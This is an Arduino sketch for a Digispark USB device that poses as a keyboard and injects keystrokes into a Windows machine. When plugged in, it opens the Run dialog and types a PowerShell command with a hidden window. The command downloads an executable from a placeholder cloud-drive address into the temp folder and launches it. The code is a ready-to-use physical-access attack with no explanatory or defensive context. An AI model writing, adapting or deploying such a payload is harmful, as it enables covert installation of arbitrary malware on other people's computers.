#include "DigiKeyboard.h"
#define KEY_ESC     41
#define KEY_BACKSPACE 42
#define KEY_TAB     43
#define KEY_PRT_SCR 70
#define KEY_DELETE  76
#define KEY_CAPS_LOCK  57

void setup() {

DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print(F("powershell -WindowStyle Hidden (new-object System.Net.WebClient).DownloadFile('网盘地址/文件名.exe','%TEMP%")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F("文件名.exe'); Start-Process ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("%TEMP%")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F("文件名.exe")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(""));
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);
}


void loop() {

}

